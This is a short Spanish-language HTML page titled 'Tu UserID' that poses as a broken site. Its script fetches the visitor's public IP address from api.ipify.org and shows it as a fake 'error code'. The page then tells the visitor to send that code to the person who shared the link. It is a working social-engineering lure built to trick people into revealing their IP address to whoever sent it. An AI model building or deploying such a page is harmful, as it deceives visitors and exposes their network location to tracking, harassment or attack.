<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Tu UserID</title>

    <style>
        body {
            background-color: black;
            font-family: Arial, sans-serif;
        }
        h1 {
            color: white
        }
        h4 {
        color: red
        }
    </style>
</head>
<body>
    <h1>Ocurrió un error al mostrar los componentes. Para solucionarlo mandale este código a la persona que te mando el enlace:</h1>
    <script>
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                document.body.innerHTML = '<h1>Ocurrió un error al mostrar los componentes. Para solucionarlo mandale este código a la persona que te mando el enlace:</h1> <h4> Código de error: ' + data.ip + '</h4>';
            })
            .catch(() => {
                document.body.innerHTML = '<h1>Error: no hay conexión a internet.</h1>';
            });
    </script>
</body>
</html>
